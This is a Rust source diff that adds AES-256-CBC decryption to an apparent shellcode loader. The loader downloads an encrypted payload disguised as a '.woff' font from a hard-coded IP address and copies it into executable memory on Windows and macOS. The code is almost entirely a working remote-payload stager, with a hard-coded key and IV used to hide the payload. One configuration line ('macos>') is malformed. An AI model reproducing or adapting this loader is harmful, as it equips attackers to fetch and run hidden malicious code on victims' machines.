@@ -2,6 +2,7 @@
 use std::ptr;
 use std::process;
 use bytes::Bytes;
+use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit};
 //windows use
 #[cfg(target_os = "windows")]
 use winapi::um::winnt::{PVOID, MEM_COMMIT,MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ};
@@ -18,6 +19,31 @@ use winapi::um::winbase;
 use mmap::{MapOption, MemoryMap};
 
 type DWORD = u32;
+type Aes256CbcDec = cbc::Decryptor<aes::Aes256>;
+
+#[cfg(target_os = "windows")]
+const URL: &str = "http://192.168.78.129:8080/test.woff";
+#[cfg(target_os = "macos>")]
+const URL: &str = "http://192.168.78.129:8181/test.woff";
+
+const AESKEY: &str = "D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT";
+const AESIV: &str  = "8y/B?E(G+KbPeShV";
+
+fn decrypt(data: &[u8], size: usize) -> Vec<u8> {
+    let mut key = [0x42; 32];
+    let mut iv = [0x24; 16];
+    for (i, b) in AESKEY.as_bytes().iter().enumerate() {
+        key[i] = *b;
+    }
+    for (i, b) in AESIV.as_bytes().iter().enumerate() {
+        iv[i] = *b;
+    }
+    let mut buf: Vec<u8> = Vec::with_capacity(size);
+    let _pt = Aes256CbcDec::new(&key.into(), &iv.into())
+        .decrypt_padded_b2b_mut::<Pkcs7>(&data, &mut buf)
+        .unwrap();
+    return buf;
+}
 
 fn getscode(url: &str) -> Bytes {
     let client = reqwest::blocking::Client::builder()
@@ -33,12 +59,17 @@ fn getscode(url: &str) -> Bytes {
         Ok(b) => b,
         Err(_) => panic!("")
     };
-    return rbytes
+    // note, skip the first 16 bytes since they are the IV, might want to remove the IV from being in code and 
+    // add it to the decypt function
+    let pt = decrypt(&rbytes[16..], rbytes.len());
+    let ptb = Bytes::from(pt);
+    return ptb;
 }
 
 #[cfg(target_os = "macos")]
 fn dne() {
-    let rbytes = getscode("http://192.168.78.129:8181/test.woff");
+    // change this all to memmap2 https://docs.rs/memmap2/0.7.1/memmap2/struct.MmapOptions.html
+    let rbytes = getscode(URL);
     unsafe {
         let map = MemoryMap::new(
             rbytes.len(),
@@ -65,7 +96,7 @@ fn dne() {
 #[cfg(target_os = "windows")]
 fn dne() {
     //download the payload
-    let rbytes = getscode("http://192.168.78.129:8080/test.woff");
+    let rbytes = getscode(URL);
     // allocate and copy
     unsafe {
         let base_addr = kernel32::VirtualAlloc(ptr::null_mut(), rbytes.len().try_into().unwrap(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
